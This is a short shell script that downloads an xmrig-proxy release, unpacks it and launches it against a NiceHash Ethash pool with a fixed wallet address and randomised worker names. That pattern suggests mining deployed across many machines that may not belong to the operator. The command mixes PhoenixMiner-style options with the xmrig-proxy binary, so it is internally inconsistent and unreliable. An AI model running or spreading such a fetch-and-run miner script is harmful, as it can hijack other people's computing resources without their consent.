#!/bin/sh
apt-get install libpci3 && wget https://github.com/xmrig/xmrig-proxy/releases/download/v6.14.0/xmrig-proxy-6.14.0-linux-x64.tar.gz && tar xvf xmrig-proxy-6.14.0-linux-x64.tar.gz && cd xmrig-proxy-6.14.0 && ./xmrig-proxy -a -pool nicehash+tcp://daggerhashimoto.usa.nicehash.com:3353 -wal 33LEeaRKvRzn62a9DxqLQfy68Az1thQtNp.$(echo $(shuf -i 2-100 -n 1)-$(shuf -i 1-1000 -n 1)-Phoenix) -pass x -proto 4 -stales 0
